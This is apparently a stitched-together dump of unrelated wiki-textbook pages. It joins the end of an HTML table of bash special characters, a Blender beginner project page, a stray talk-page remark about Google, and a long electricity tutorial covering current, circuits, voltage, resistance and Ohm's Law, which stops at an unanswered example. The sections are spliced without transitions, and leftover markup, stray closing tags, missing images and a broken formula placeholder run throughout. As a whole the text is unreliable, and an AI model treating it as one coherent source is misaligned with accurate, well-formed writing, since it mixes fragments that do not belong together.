&lt;tr&gt; &lt;td&gt;&lt;tt&gt;:&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Colon.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;;&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Semicolon. Separates lines if no newline/EOL exists. E.g. echo hello; echo world&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;&amp;lt;&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Open angle bracket. Used for input redirection&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;=&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Equality sign. Used to assign variables and check equality&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;&gt;&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Closing angle bracket. Used for output redirection.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;?&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Question Mark.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;@&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;At sign. Typically used as a variable containing all arguments passed to the environment as $@&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;[&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Open square bracket. Used as a more visually appealing alternative to test. E.g. if [ condition ] ; then etc&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;\&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Backslash. Most commonly used for escaping. E.g. rm file\ with\ a\ bunch\ of\ spaces.txt&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;]&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Closing square bracket. Closes test enclosures&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;^&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Caret.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;_&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Underscore.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;`&amp;hellip;`&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;&lt;ul&gt;&lt;li&gt;Triggers command substitution; equivalent to &lt;tt&gt;$(&amp;hellip;)&lt;/tt&gt;, but is somewhat more error-prone.&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;{&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Open curly brace. Used for specific variable expansion. E.g. (where var = &quot;hello &quot;) echo &quot;${var}world&quot; will print &quot;hello world&quot;, echo &quot;$varworld&quot; will generate an error, expecting a variable called varworld.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;|&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Pipe. Used for redirecting input to output. Specifically, it takes the output of the command on the left hand side, runs the program on the right side, and then passes the contents of the first command's output to the second, as if it were being typed from a keyboard. 'ls -l | grep Desk' is equivalent to running &quot;grep Desk&quot;, and then manually typing what ls -l would have output. Every press of the return key would then trigger grep until ^D is pressed to pass the EOF.&lt;!--I think that is a very intuitive way to think about it.--&gt;&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;}&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Closing curly brace.&lt;/td&gt; &lt;/tr&gt;

&lt;tr&gt; &lt;td&gt;&lt;tt&gt;~&lt;/tt&gt;&lt;/td&gt; &lt;td&gt;Tilde. Typically used to refer to the home directory. Logged in as &quot;mrwhite&quot;, cd ~ (or just cd) would go to /home/mrwhite. Logged in as another user, the same effect could be achieved with 'cd ~mrwhite'.&lt;/td&gt; &lt;/tr&gt;

&lt;/table&gt;

      <text xml:space="preserve">Now that you've gotten the hang of 3D modeling, it's important to get some community feedback on your progress.  Don't be an idiot and skip this part, or you'll regret it later.  Basically this will help you track your progress and give you something that you'll be working on over a long term and something you'll be proud of.

* First, you need to come up with a project idea.  You can choose your own modeling project, or choose one from the list below.

* Second, you need to create a model of your idea.  Spend a couple of hours on it, and give it some details.

* Third, once you believe you've come far enough with the model, post it in the [http://blenderartists.org/forum/forumdisplay.php?s=b6a3696a3b803274bb7c1b49df9a22a2&amp;f=16 Works In Progress] forum on BlenderArtists.org(formerly elysiun.com) (you will have to create an account if you haven't already).  Post several screenshots of your model from within the Blender (note: creating screenshots is outside the scope of this wikibook, though see note lower down the page).  You can post whatever subject and message with your posting that you would like, or you can use this suggested subject and message:

:Subject: Beginning Modeling Final Project - &lt;project name&gt;

:: Please assist me with any feedback on my model, keeping in mind that I am an absolute beginner still.  I appreciate your help.

* Wait for feedback.  It usually comes very quickly.  If you have any questions about feedback that you are given, don't be afraid to ask your questions in the forum.

* When you and others that have viewed your work feel that you are ready, save your model in some place you can get back to easily.  You will continue working on this project once you've learned some new skills.

* Move on to the next page.

(BTW. in Windows and/or maybe other OS, to take a screenshot press 'PrtScn' (PrintScreen). It will copy the screen to clipboard for you to paste in your favourite graphics application. This may not work in other OSs but try anyway. You can also create Blender screenshot directly from Blender using menu '''File&gt;Dump 3DView...''' or '''File&gt;Dump Screen...''' )

(In linux under the KDE I use ksnapshot, check under the graphics tab and see if you have it.  If not it should be just a google search away :) gl and happy blendering)

(On Mac OS X, press Command (Apple) + Shift + 3 to do a full screen capture)

*List of ideas:
*A Computer and keyboard
*A fishing rod
*A train engine
*A skyscraper
*A robot
*A Tank (real or made up)
*An airplane
*A truck or car
*Household appliances
*A Weapon

:Hi, Ashl, nice to meet you on Wikibooks.
:Thank you for pointing out that ''I'm feeling lucky'' is in fact ''always'' the first site that Google finds, and is not always a random function, like I first thought it was. (Having used Google for five years and more, I should know better[!]). I suppose clicking it over and over is like banging your head against the brick wall - it's so ''obvious''! :-)
:I'm sure the new users will appreciate that; if they haven't discovered/explored for themselves, like this book ([[Windows XP for Beginners]]) encourages them to do.

= Flow of ''Charge'' =

While the normal motion of &quot;free&quot; electrons in a conductor is random, with no particular direction or speed, electrons can be influenced to move in
a coordinated fashion through a conductive material. This motion of electrons is what we call ''electricity'', or 
''electric current''. This is in contrast to ''static'' electricity, which is an unmoving accumulation of electric charge.
Just like water flowing through the emptiness of a pipe, electrons are able to move between the atoms of a
conductor. The conductor may appear to be solid to our eyes, but any material composed of atoms is mostly empty space! The liquid-flow
analogy is so fitting that the motion of electrons through a conductor is often referred to as a &quot;flow.&quot; 

As each electron moves uniformly through a conductor, it pushes on the one ahead of it, such
that all the electrons move together as a group. The starting and stopping of electron flow through the length of a conductor is
virtually instantaneous from one end of a conductor to the other, even though the motion of each electron may be very slow. As an analogy
consider a tube filled end-to-end with marbles: 

[[Image:Fhsst_electricity1.png|fhsst_electricity1.png]]

The tube is full of marbles, just as a conductor is full of free electrons. If a single marble is suddenly inserted into this full tube on the left-hand side,
another marble will immediately try to exit the tube on the right. Even though each marble only traveled a short distance, the transfer
of motion through the tube is virtually instantaneous from the left end to the right end, no matter how long the tube is. With
electricity, the overall effect from one end of a conductor to the other effectively instantaneous. Each individual electron, though,
travels through the conductor at a ''much'' slower pace. 

If we want electrons to flow in a certain direction to a certain place, we must provide the proper path for them to move, just as a
plumber must install piping to get water to flow where he or she wants it to flow. ''Wires'' made of highly
conductive metals such as copper or aluminum are used to form this path.

This means that there can be electric current ''only'' where there exists a continuous path of conductive material (wire) providing a path for
electrons. In the marble analogy, marbles can flow into the left-hand side of the tube (and, consequently, through the
tube) only if the tube is open on the right-hand side for marbles to flow out. If the tube is blocked on the right-hand side,
the marbles will just &quot;pile up&quot; inside the tube, and marble &quot;flow&quot; will not occur. The same holds true for electric current: the
continuous flow of electrons requires there be an unbroken path. Let's look at a diagram to illustrate how this works: 

[[Image:Fhsst_electricity2.png|fhsst_electricity2.png]]

A thin, solid line (as shown above) is the conventional symbol for a continuous piece of wire. Since the wire is made of a conductive
material, such as copper, its constituent atoms have many free electrons which can easily move through the wire. However, there will
never be a continuous or uniform flow of electrons within this wire unless they have a place to come from and a place to go. Let's add an
hypothetical electron &quot;Source&quot; and &quot;Destination:&quot;  

[[Image:Fhsst_electricity3.png|fhsst_electricity3.png]]

Now, with the Electron Source pushing new electrons into the wire on the left-hand side, electron flow through the wire can occur (as
indicated by the arrows pointing from left to right). However, the flow will be interrupted if the conductive path formed by the wire is
broken: 

[[Image:Fhsst_electricity4.png|fhsst_electricity4.png]]

Air is an insulator, and an air gap separates the two pieces of wire, the path has now been broken, and
electrons cannot flow from Source to Destination. This is like cutting a water pipe in two and capping off the broken ends of the
pipe: water can't flow if there's no exit out of the pipe.  

If we were to take another piece of wire leading to the Destination and simply make physical contact with the wire leading to the Source,
we would once again have a continuous path for electrons to flow. The two dots in the diagram indicate physical (metal-to-metal) contact
between the wire pieces: 

[[Image:Fhsst_electricity5.png|fhsst_electricity5.png]]

Now, we have continuity from the Source, to the newly-made connection, down, to the right, and up to the Destination. Please take
note that the broken segment of wire on the right hand side has no electrons flowing through it, because it is no longer part of a
complete path from Source to Destination. 

It is interesting to note that no &quot;wear&quot; occurs within wires due to this electric current, unlike water-carrying pipes which are
eventually corroded and worn by prolonged flows. Electrons do encounter some degree of friction as they move and this
friction can generate heat in a conductor. This is a topic we'll discuss later.</text>

= Circuits =

In order for the Source-and-Destination scheme to work, both would have to have a huge reservoir of electrons in order to sustain a continuous flow! Using the marble-and-tube analogy, the marble source and marble destination buckets would have to be large reservoirs to contain enough marble capacity for a &quot;flow&quot; of marbles to be sustained. 

The answer to this paradox is found in the concept of a ''circuit'': a never-ending looped pathway for electrons. If we
take a wire, or many wires joined end-to-end, and loop it around so that it forms a continuous pathway ( a circle), we have the means to support a uniform flow of electrons without having to resort to huge reservoirs. 

Each electron advancing clockwise in this circuit pushes on the one in front of it, which pushes on the one in front of it, and so on, and so on, just like a hula-hoop filled with marbles. Now, we have the capability of supporting a continuous flow of electrons indefinitely without the need for reservoirs. All we need to maintain this flow is a continuous means of motivation for those electrons, which we'll address in the next section of this chapter. 

It must be realized that continuity is just as important in a circuit as it is in a straight piece of wire. Just as in the example with the straight piece of wire between the electron Source and Destination, any break in this circuit will prevent electrons from flowing through it

An important principle to realize here is that ''it doesn't matter where the break occurs''. Any discontinuity in the circuit
will prevent electron flow throughout the entire circuit.

A combination of batteries and conductors with other components is called an electric circuit or circuit. The word circuit implies that you return to your starting point and this is an important property of electric circuits. They must contain a closed loop before charge can flow.

The simplest possible circuit is a battery with a single conductor. Now how do we form a closed loop with these two
components? The battery has two terminals (connection points). One is called the positive terminal and one the negative. When we describe charge flowing we consider charges moving from the positive terminal of the battery around the conductor and back
into the battery at the negative terminal. As much charge flows out of the positive terminal as flows into the negative terminal so there is no build up of charge in the battery. The battery does work on the charges causing them to move round the circuit.

Now I keep talking about batteries and circuits but we need to draw these things to help keep the ideas clear in our minds. To do this we need to agree on how to draw things so that other people can understand what we are doing. We need a convention.

= Voltage and current =

As was previously mentioned, we need more than just a continuous path (circuit) before a continuous flow of electrons will occur: we also
need some means to push these electrons around the circuit. Just like marbles in a tube or water in a pipe, it takes some kind of
influencing force to initiate flow. With electrons, this force is the same force at work in static electricity: the force produced by an
imbalance of electric charge. 

The electric charge difference serves to store a certain amount of energy. This energy is 
not unlike the energy stored in a high reservoir of water that has been pumped from a lower-level pond: 

The influence of gravity on the water in the reservoir creates a force that attempts to move the water down to the lower level again. If a
suitable pipe is run from the reservoir back to the pond, water will flow under the influence of gravity down from the reservoir, through
the pipe: 

[[Image:Fhsst_electricity10.png|fhsst_electricity10.png]]

It takes energy to pump that water from the low-level pond to the high-level reservoir, and the movement of water through the piping
back down to its original level constitutes a releasing of energy stored from previous pumping. 

If the water is pumped to an even higher level, it will take even more energy to do so, thus more energy will be stored, and more energy
released if the water is allowed to flow through a pipe back down again: 

[[Image:Fhsst_electricity11.png|fhsst_electricity11.png]]

Electrons are not much different. If we &quot;pump&quot; electrons away from their normal &quot;levels,&quot; creating a condition where a force exists
as the electrons seek  to re-establish their former positions. The force attracting electrons back to their 
original positions is analogous to the force gravity exerts on water in the reservoir, trying to draw it down to its former level. 

Just as the pumping of water to a higher level results in energy being stored, &quot;pumping&quot; electrons to create an electric charge imbalance
results in a certain amount of energy being stored in that imbalance. And, just as providing a way for water to flow back down from the
heights of the reservoir results in a release of that stored energy, providing a way for electrons to flow back to their original &quot;levels&quot;
results in a release of stored energy. 

When the electrons are poised in that static condition (just like water sitting still, high in a reservoir), the energy stored there is
called ''potential energy'', because it has the possibility (potential) of release that has not been fully realized yet. 

This potential energy, stored in the form of an electric charge imbalance and capable of provoking electrons to flow through a
conductor, can be expressed as a term called ''voltage'', which technically is a measure of potential energy per unit charge of
electrons, or something a physicist would call ''specific potential energy''. Defined in the context of static electricity,
voltage is the measure of work required to move a unit charge from one location to another, against the force which tries to keep electric
charges balanced. In the context of electrical power sources, voltage is the amount of potential energy available (work to be done) per unit
charge, to move electrons through a conductor. 

Because voltage is an expression of potential energy, representing the possibility or potential for energy release as the electrons move from
one &quot;level&quot; to another, it is always referenced between two points. Consider the water reservoir analogy: 

[[Image:Fhsst_electricity12.png|fhsst_electricity12.png]]

Because of the difference in the height of the drop, there's potential for much more energy to be released from the reservoir through the
piping to location 2 than to location 1. The principle can be intuitively understood in dropping a rock: which results in a more
violent impact, a rock dropped from a height of one foot, or the same rock dropped from a height of one kilometre? Obviously, the drop of
greater height results in greater energy released (a more violent impact). We cannot assess the amount of stored energy in a water
reservoir simply by measuring the volume of water any more than we can predict the severity of a falling rock's impact simply from knowing
the weight of the rock: in both cases we must also consider how ''far'' these masses will drop from their initial height. The
amount of energy released by allowing a mass to drop is relative to the distance ''between'' its starting and ending points.
Likewise, the potential energy available for moving electrons from one point to another is relative to those two points. Therefore, voltage
is always expressed as a quantity ''between'' two points. Interestingly enough, the analogy of a mass potentially &quot;dropping&quot;
from one height to another is such an apt model that voltage between two points is sometimes called a ''voltage drop''. 

Voltage can be generated by means other than rubbing certain types of materials against each other. Chemical reactions, radiant energy, and
the influence of magnetism on conductors are a few ways in which voltage may be produced. Respective examples of these three sources
of voltage are batteries, solar cells, and generators (such as the &quot;alternator&quot; unit under the hood of your automobile). For now, we
won't go into detail as to how each of these voltage sources works - more important is that we understand how voltage sources can be
applied to create electron flow in a circuit. 

Let's take the symbol for a chemical battery and build a circuit step by step:

[[Image:Fhsst_electricity13.png|fhsst_electricity13.png]]

Any source of voltage, including batteries, have two points for electrical contact. In this case, we have point 1 and point 2 in the
above diagram. The horizontal lines of varying length indicate that this is a battery, and they further indicate the direction which this
battery's voltage will try to push electrons through a circuit. The fact that the horizontal lines in the battery symbol appear separated
(and thus unable to serve as a path for electrons to move) is no cause for concern: in real life, those horizontal lines represent metallic
plates immersed in a liquid or semi-solid material that not only conducts electrons, but also generates the voltage to push them along
by interacting with the plates. 

Notice the little &quot;+&quot; and &quot;-&quot; signs to the immediate left of the battery symbol. The negative (-) end of the battery is always the end
with the shortest dash, and the positive (+) end of the battery is always the end with the longest dash. Since we have decided to call
electrons &quot;negatively&quot; charged (thanks, Ben!), the negative end of a battery is that end which tries to push electrons out of it.
Likewise, the positive end is that end which tries to attract electrons. 

With the &quot;+&quot; and &quot;-&quot; ends of the battery not connected to anything, there will be voltage between those two points, but there will be no
flow of electrons through the battery, because there is no continuous path for the electrons to move. 

[[Image:Fhsst_electricity14.png|fhsst_electricity14.png]]

The same principle holds true for the water reservoir and pump analogy: without a return pipe back to the pond, stored energy in the
reservoir cannot be released in the form of water flow. Once the reservoir is completely filled up, no flow can occur, no matter how
much pressure the pump may generate. There needs to be a complete path (circuit) for water to flow from the pond, to the reservoir, and
back to the pond in order for continuous flow to occur. 

We can provide such a path for the battery by connecting a piece of wire from one end of the battery to the other. Forming a circuit with
a loop of wire, we will initiate a continuous flow of electrons in a clockwise direction: 

[[Image:Fhsst_electricity15.png|fhsst_electricity15.png]]

So long as the battery continues to produce voltage and the continuity of the electrical path isn't broken, electrons will continue to flow
in the circuit. Following the metaphor of water moving through a pipe, this continuous, uniform flow of electrons through the circuit
is called a ''current''. So long as the voltage source keeps &quot;pushing&quot; in the same direction, the electron flow will continue to
move in the same direction in the circuit. This single-direction flow of electrons is called a ''Direct Current'', or DC. 

Because electric current is composed of individual electrons flowing in unison through a conductor by moving along and pushing on the
electrons ahead, just like marbles through a tube or water through a pipe, the amount of flow throughout a single circuit will be the same
at any point. If we were to monitor a cross-section of the wire in a single circuit, counting the electrons flowing by, we would notice the
exact same quantity per unit of time as in any other part of the circuit, regardless of conductor length or conductor diameter. 

If we break the circuit's continuity ''at any point'', the electric current will cease in the entire loop, and the full voltage
produced by the battery will be manifested across the break, between the wire ends that used to be connected: 

[[Image:Fhsst_electricity16.png|fhsst_electricity16.png]]

Notice the &quot;+&quot; and &quot;-&quot; signs drawn at the ends of the break in the circuit, and how they correspond to the &quot;+&quot; and &quot;-&quot; signs next to the
battery's terminals. These markers indicate the direction that the voltage attempts to push electron flow. Remember that voltage is
always relative between two points. Whether a point in a circuit gets labeled with a &quot;+&quot; or a &quot;-&quot; depends 
on the other point to which it is referenced. Take a look at the following circuit, where each corner of the loop is marked with a
number for reference: 

[[Image:Fhsst_electricity17.png|fhsst_electricity17.png]]

With the circuit's continuity broken between points 2 and 3, voltage dropped between points 2 and 3 is &quot;-&quot; for 
point 2 and &quot;+&quot; for point 3. 

Now let's see what happens if we connect points 2 and 3 back together again, but place a break in the circuit between points 3 and 4: 

[[Image:Fhsst_electricity18.png|fhsst_electricity18.png]]

With the break between 3 and 4, the voltage drop between those two points is &quot;+&quot; for 4 and &quot;-&quot; for 3. Take special
note of the fact that point 3's &quot;sign&quot; is opposite of that in the first example, where the break was between points 2 and 3 (where point
3 was labeled &quot;+&quot;). It is impossible for us to say that point 3 in this circuit will always be either &quot;+&quot; or &quot;-&quot;, because the sign is not
specific to a single point, but is always relative between two points!</text>

= Resistance =

The circuit in the previous section is not a very practical one. In fact, it can be quite dangerous to build (directly connecting the
poles of a voltage source together with a single piece of wire). The reason it is dangerous is because the magnitude of electric current
may be very large in such a ''short circuit'', and the release of energy very dramatic (usually in the form of heat). Usually, electric
circuits are constructed in such a way as to make practical use of that released energy, in as safe a manner as possible. 

One practical and popular use of electric current is for the operation of electric lighting. The simplest form of electric lamp is a tiny
metal &quot;filament&quot; inside of a clear glass bulb, which glows white-hot (&quot;incandesces&quot;) with heat energy when sufficient electric current
passes through it. Like the battery, it has two conductive connection points, one for electrons to enter and the other for electrons to
exit. 

As the electrons work their way through the thin metal filament of the lamp, they encounter more opposition to motion than they typically
would in a thick piece of wire. This opposition to electric current depends on the type of material, its cross-sectional area, and its
temperature. It is technically known as ''resistance''. (It can be said that conductors have low resistance and insulators have very
high resistance.) This resistance serves to limit the amount of current through the circuit with a given amount of voltage supplied by
the battery, as compared with the &quot;short circuit&quot; where we had nothing but a wire joining one end of the voltage source (battery) to the
other. 

When electrons move against the opposition of resistance, &quot;friction&quot; is generated. Just like mechanical friction, the friction produced by
electrons flowing against a resistance manifests itself in the form of heat. The concentrated resistance of a lamp's filament results in a
relatively large amount of heat energy dissipated at that filament. This heat energy is enough to cause the filament to glow white-hot,
producing light, whereas the wires connecting the lamp to the battery (which have much lower resistance) hardly even get warm while
conducting the same amount of current. 

As in the case of the short circuit, if the continuity of the circuit is broken at any point, electron flow stops throughout the entire
circuit. With a lamp in place, this means that it will stop glowing.

As before, with no flow of electrons, the entire potential (voltage) of the battery is available across the break, waiting for the
opportunity of a connection to bridge across that break and permit electron flow again. This condition is known as an ''open
circuit'', where a break in the continuity of the circuit prevents current throughout. All it takes is a single break in continuity to
&quot;open&quot; a circuit. Once any breaks have been connected once again and the continuity of the circuit re-established, it is known as a
''closed circuit''. 

What we see here is the basis for switching lamps on and off by remote switches. Because any break in a circuit's continuity results in
current stopping throughout the entire circuit, we can use a device designed to intentionally break that continuity (called a
''switch''), mounted at any convenient location that we can run wires to, to control the flow of electrons in the circuit.



This is how a switch mounted on the wall of a house can control a lamp that is mounted down a long hallway, or even in another room, far away
from the switch. The switch itself is constructed of a pair of conductive contacts (usually made of some kind of metal) forced
together by a mechanical lever actuator or pushbutton. When the contacts touch each other, electrons are able to flow from one to the
other and the circuit's continuity is established  when the contacts are separated, electron flow from one to the other is prevented by the
insulation of the air between, and the circuit's continuity is broken. 

In keeping with the &quot;open&quot; and &quot;closed&quot; terminology of circuits, a switch that is making contact from one connection terminal to the
other provides continuity for electrons to flow through, and is called a ''closed'' switch. Conversely, a switch that is breaking
continuity won't allow electrons to pass through and is called an ''open'' switch. This terminology is often confusing to the new
student of electronics, because the words &quot;open&quot; and &quot;closed&quot; are commonly understood in the context of a door, where &quot;open&quot; is equated
with free passage and &quot;closed&quot; with blockage. With electrical switches, these terms have opposite meaning: &quot;open&quot; means no flow
while &quot;closed&quot; means free passage of electrons.</text>

= Voltage and current in a practical circuit =

Because it takes energy to force electrons to flow against the opposition of a resistance, there will be voltage manifested (or
&quot;dropped&quot;) between any points in a circuit with resistance between them. It is important to note that although the amount of current
(the quantity of electrons moving past a given point every second) is uniform in a simple circuit, the amount of voltage (potential energy
per unit charge) between different sets of points in a single circuit may vary considerably: 

[[Image:Fhsst_electricity22.png|Fhsst_electricity22.png]]

Take this circuit as an example. If we label four points in this circuit with the numbers 1, 2, 3, and 4, we will find that the amount
of current conducted through the wire between points 1 and 2 is exactly the same as the amount of current conducted through the lamp
(between points 2 and 3). This same quantity of current passes through the wire between points 3 and 4, and through the battery
(between points 1 and 4). 

However, we will find the voltage appearing between any two of these points to be directly proportional to the resistance within the
conductive path between those two points, given that the amount of current along any part of the circuit's path is the same (which, for
this simple circuit, it is). In a normal lamp circuit, the resistance of a lamp will be much greater than the resistance of the connecting
wires, so we should expect to see a substantial amount of voltage between points 2 and 3, with very little between points 1 and 2, or
between 3 and 4. The voltage between points 1 and 4, of course, will be the full amount of &quot;force&quot; offered by the battery, which will be
only slightly greater than the voltage across the lamp (between points 2 and 3). 

This, again, is analogous to the water reservoir system:

[[Image:Fhsst_electricity23.png|Fhsst_electricity23.png]]

Between points 2 and 3, where the falling water is releasing energy at the water-wheel, there is a difference of pressure between the two
points, reflecting the opposition to the flow of water through the water-wheel. From point 1 to point 2, or from point 3 to point 4,
where water is flowing freely through reservoirs with little opposition, there is little or no difference of pressure (no potential
energy). However, the rate of water flow in this continuous system is the same everywhere (assuming the water levels in both pond and
reservoir are unchanging): through the pump, through the water-wheel, and through all the pipes. So it is with simple electric circuits:
the rate of electron flow is the same at every point in the circuit, although voltages may differ between different sets of points. 

When Benjamin Franklin made his conjecture regarding the direction of charge flow (from the smooth wax to the rough wool), he set a
precedent for electrical notation that exists to this day, despite the fact that we know electrons are the constituent units of charge, and
that they are displaced from the wool to the wax - not from the wax to the wool - when those two substances are rubbed together. This is
why electrons are said to have a ''negative'' charge: because Franklin assumed electric charge moved in the opposite direction that
it actually does, and so objects he called &quot;negative&quot; (representing a deficiency of charge) actually have a surplus of electrons. 

By the time the true direction of electron flow was discovered, the nomenclature of &quot;positive&quot; and &quot;negative&quot; had already been so well
established in the scientific community that no effort was made to change it, although calling electrons &quot;positive&quot; would make more sense
in referring to &quot;excess&quot; charge. You see, the terms &quot;positive&quot; and &quot;negative&quot; are human inventions, and as such have no absolute meaning
beyond our own conventions of language and scientific description. Franklin could have just as easily referred to a surplus of charge as
&quot;black&quot; and a deficiency as &quot;white,&quot; in which case scientists would speak of electrons having a &quot;white&quot; charge (assuming the same
incorrect conjecture of charge position between wax and wool).  

However, because we tend to associate the word &quot;positive&quot; with &quot;surplus&quot; and &quot;negative&quot; with &quot;deficiency,&quot; the standard label for
electron charge does seem backward. Because of this, many engineers decided to retain the old concept of electricity with &quot;positive&quot;
referring to a surplus of charge, and label charge flow (current) accordingly. This became known as ''conventional flow''
notation: 

[[Image:Fhsst_electricity24.png|Fhsst_electricity24.png]]

Others chose to designate charge flow according to the actual motion of electrons in a circuit. This form of symbology became known as
''electron flow'' notation: 

[[Image:Fhsst_electricity25.png|Fhsst_electricity25.png]]

In conventional flow notation, we show the motion of charge according to the (technically incorrect) labels of + and -. This way the labels
make sense, but the direction of charge flow is incorrect. Does it matter, really, how we designate charge flow in a circuit? Not really, so
long as we're consistent in the use of our symbols. You may follow an imagined direction of current (conventional flow) or the actual
(electron flow) with equal success insofar as circuit analysis is concerned. Concepts of voltage, current, resistance, continuity, and
even mathematical treatments such as Ohm's Law (chapter 2) and Kirchhoff's Laws (chapter 6) remain just as valid with either style of
notation.</text>

= How voltage, current, and resistance relate =

First lets recap some of the ideas we have learned so far. We will need these to understand how voltage, current and resistance relate.

An electric circuit is formed when a conductive path is created to allow free electrons to continuously move. This continuous movement
of free electrons through the conductors of a circuit is called a ''current'', and it is often referred to in terms of &quot;flow,&quot; just
like the flow of a liquid through a hollow pipe.  

The force motivating electrons to &quot;flow&quot; in a circuit is called ''voltage''. Voltage is a specific measure of potential energy
that is always relative between two points. When we speak of a certain amount of voltage being present in a circuit, we are referring
to the measurement of how much ''potential'' energy exists to move electrons from one particular point in that circuit to another
particular point. Without reference to ''two'' particular points, the term &quot;voltage&quot; has no meaning. 

Free electrons tend to move through conductors with some degree of friction, or opposition to motion. This opposition to motion is more
properly called ''resistance''. The amount of current in a circuit depends on the amount of voltage available to motivate the
electrons, and also the amount of resistance in the circuit to oppose electron flow. Just like voltage, resistance is a quantity relative
between two points. For this reason, the quantities of voltage and resistance are often stated as being &quot;between&quot; or &quot;across&quot; two points
in a circuit. 

To be able to make meaningful statements about these quantities in circuits, we need to be able to describe their quantities in the same
way that we might quantify mass, temperature, volume, length, or any other kind of physical quantity. For mass we might use the units of
&quot;pound&quot; or &quot;gram.&quot; For temperature we might use degrees Fahrenheit or degrees Celsius. Here are the standard units of measurement for
electrical current, voltage, and resistance:  

[[Image:Fhsst_electricity26.png|Fhsst_electricity26.png]]

The &quot;symbol&quot; given for each quantity is the standard alphabetical letter used to represent that quantity in an algebraic equation.
Standardized letters like these are common in the disciplines of physics and engineering, and are internationally recognized. The
&quot;unit abbreviation&quot; for each quantity represents the alphabetical symbol used as a shorthand notation for its particular unit of
measurement. And, yes, that strange-looking &quot;horseshoe&quot; symbol is the capital Greek letter &lt;font class=&quot;MATH&quot;&gt;[img1.png [IMAGE png]]'', just a character in a ''foreign''
alphabet (apologies to any Greek readers here). 

Each unit of measurement is named after a famous experimenter in electricity: The ''ampere'' after the Frenchman Andre M. Ampere, the ''volt'' after the Italian Alessandro Volta, and the ''ohm'' after the German Georg Simon Ohm. 

The mathematical symbol for each quantity is meaningful as well. The ''R'' for resistance and the ''V'' for voltage are both self-explanatory,
whereas ''I'' for current seems a bit weird. The ''I'' is thought to have been meant to represent &quot;Intensity&quot; (of electron flow), and the other
symbol for voltage, ''E,'' stands for &quot;Electromotive force.&quot; From what research I've been able to do, there seems to be some dispute over the
meaning of ''I.'' The symbols ''E'' and ''V'' are interchangeable for the most part, although some texts reserve ''E'' to represent voltage across
a source (such as a battery or generator) and ''V'' to represent voltage across anything else. 

One foundational unit of electrical measurement, often taught in the beginnings of electronics courses but used infrequently afterwards, is
the unit of the ''coulomb'', which is a measure of electric charge proportional to the number of electrons in an imbalanced state.
One coulomb of charge is equal to 6,250,000,000,000,000,000 electrons. The symbol for electric charge quantity is the capital letter ''Q,''
with the unit of coulombs abbreviated by the capital letter &quot;C.&quot; It so happens that the unit for electron flow, the ampere, is equal to 1
coulomb of electrons passing by a given point in a circuit in 1 second of time. Cast in these terms, current is the ''rate of electric
charge motion'' through a conductor. 

As stated before, voltage is the measure of ''potential energy per unit charge'' available to motivate electrons from one point to
another. Before we can precisely define what a &quot;volt&quot; is, we must understand how to measure this quantity we call &quot;potential energy.&quot;
The general metric unit for energy of any kind is the ''joule'', equal to the amount of work performed by a force of 1 newton exerted
through a motion of 1 meter (in the same direction).Defined in these scientific terms, 1 volt is equal to 1 joule 
of electric potential energy per (divided by) 1 coulomb of charge. Thus, a 9 volt battery releases 9 joules of energy for every coulomb
of electrons moved through a circuit. 

These units and symbols for electrical quantities will become very important to know as we begin to explore the relationships between
them in circuits. The first, and perhaps most important, relationship between current, voltage, and resistance is called Ohm's Law,
discovered by Georg Simon Ohm and published in his 1827 paper, ''The Galvanic Circuit Investigated Mathematically''. Ohm's
principal discovery was that the amount of electric current through a metal conductor in a circuit is directly proportional to the voltage
impressed across it, for any given temperature. Ohm expressed his discovery in the form of a simple equation, describing how voltage,
current, and resistance interrelate: 

[[Image:Fhsst_electricity27.png|Fhsst_electricity27.png]]

In this algebraic expression, voltage (''E'') is equal to current (''I'') multiplied by resistance (''R''). Using algebra techniques, we can
manipulate this equation into two variations, solving for ''I'' and for ''R'', respectively: 

[[Image:Fhsst_electricity28.png|Fhsst_electricity28.png]]

Let's see how these equations might work to help us analyze simple circuits:

[[Image:Fhsst_electricity29.png|Fhsst_electricity29.png]]

In the above circuit, there is only one source of voltage (the battery, on the left) and only one source of resistance to current
(the lamp, on the right). This makes it very easy to apply Ohm's Law. If we know the values of any two of the three quantities (voltage,
current, and resistance) in this circuit, we can use Ohm's Law to determine the third. 

In this first example, we will calculate the amount of current (''I'') in a circuit, given values of voltage (''E'') and resistance (''R''): 

[[Image:Fhsst_electricity30.png|Fhsst_electricity30.png]]

What is the amount of current (''I'') in this circuit?

